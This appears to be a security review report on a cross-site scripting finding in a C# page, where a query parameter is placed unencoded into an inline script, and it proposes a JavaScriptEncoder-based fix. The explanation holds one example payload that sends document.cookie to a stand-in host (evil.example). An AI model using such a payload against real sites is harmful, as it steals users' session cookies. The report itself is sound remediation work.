## Verdict

Exploitable. Confidence: high.

## Source

`Request.QueryString["q"]` (line 14) — the raw `q` query-string parameter from the incoming HTTP request, fully attacker-controlled.

## Fix

Vulnerable code (`JsContextUnencodedOutput.cs`, lines 14-23):

```csharp
string searchTerm = Request.QueryString["q"];

string script =
    "<script>" +
    "var lastSearch = '" + searchTerm + "';" +
    "trackSearch(lastSearch);" +
    "</script>";

// SAST FINDING: CWE-79 reported here. Sink is the next statement.
Response.Write(script);
```

Fixed code:

```csharp
using System.Text.Encodings.Web;
// ...

string searchTerm = Request.QueryString["q"];
string encodedSearchTerm = JavaScriptEncoder.Default.Encode(searchTerm ?? string.Empty);

string script =
    "<script>" +
    "var lastSearch = '" + encodedSearchTerm + "';" +
    "trackSearch(lastSearch);" +
    "</script>";

Response.Write(script);
```

## Explanation

`searchTerm` is concatenated directly into a single-quoted JavaScript string literal inside an inline `<script>` block, then written unencoded via `Response.Write()`. This is a script-context sink, not an HTML-body sink: HTML entity encoding would not help here, because a `<script>` element is raw text that the browser never entity-decodes. A value like `'; trackSearch(document.location='http://evil.example/'+document.cookie);//` breaks out of the string literal and executes as script. The fix applies `JavaScriptEncoder.Default.Encode()` (from `System.Text.Encodings.Web`, per the C#-specific guidance's script-context fallback pattern) to `searchTerm` before it is interpolated into the JS string literal, escaping quotes, backslashes, and the U+2028/U+2029 line terminators that can otherwise terminate the literal early, so the value can only ever be read as inert string data by `trackSearch`. This is the documented fallback for when Microsoft's preferred pattern — placing the value in a data attribute and reading it from JavaScript at runtime, so it never crosses into script source — is impractical, as it is here since the page emits only a bare inline script block with no surrounding markup to attach a data attribute to.

## Behaviour changes

- Added `searchTerm ?? string.Empty` before encoding. `JavaScriptEncoder.Default.Encode()` throws `ArgumentNullException` on a `null` input, whereas the original string concatenation silently treated a missing `q` parameter as an empty segment with no exception. The null-coalesce preserves the original no-`q`-parameter behaviour (empty `lastSearch` value, no exception) rather than introducing a new failure mode.
- All other behaviour is unchanged: `Response.Write()` is still called once, with a string of the same shape and the same `trackSearch(lastSearch)` call; only the contents of the JavaScript string literal are now escaped.
